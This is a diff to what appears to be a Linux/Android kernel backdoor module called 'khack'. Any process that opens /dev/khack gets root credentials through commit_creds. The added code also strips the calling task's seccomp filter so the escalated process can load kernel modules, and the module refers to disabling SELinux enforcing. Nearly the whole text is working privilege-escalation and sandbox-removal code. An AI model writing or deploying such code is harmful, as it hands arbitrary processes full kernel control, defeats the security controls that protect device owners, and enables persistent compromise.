@@ -16,6 +16,7 @@
 #include <linux/kernel.h>
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
+#include <linux/seccomp.h>
 #include <linux/errno.h>
 #include <linux/mm.h>
 #include <linux/string.h>
@@ -96,6 +97,20 @@ static int khack_clear_enforcing(void)
 }
 
 /* open("/dev/khack") -> caller's creds become init_cred */
+/* seccomp cannot be removed from userspace, but the task that opens the node
+ * is ours to fix: drop the filter so the escalated process can load modules
+ * without an adb shell. */
+static void khack_drop_seccomp(void)
+{
+	struct task_struct *t = current;
+
+	if (t->seccomp.mode == SECCOMP_MODE_FILTER) {
+		t->seccomp.filter = NULL;
+		t->seccomp.mode = SECCOMP_MODE_DISABLED;
+		pr_info("khack1: seccomp cleared for pid %d\n", t->pid);
+	}
+}
+
 static int khack_open(struct inode *inode, struct file *file)
 {
 	void *cred;
@@ -108,6 +123,7 @@ static int khack_open(struct inode *inode, struct file *file)
 		return -ENOMEM;
 
 	p_commit_creds(cred);
+	khack_drop_seccomp();
 	pr_info("khack1: caller escalated to init_cred\n");
 	return 0;
 }
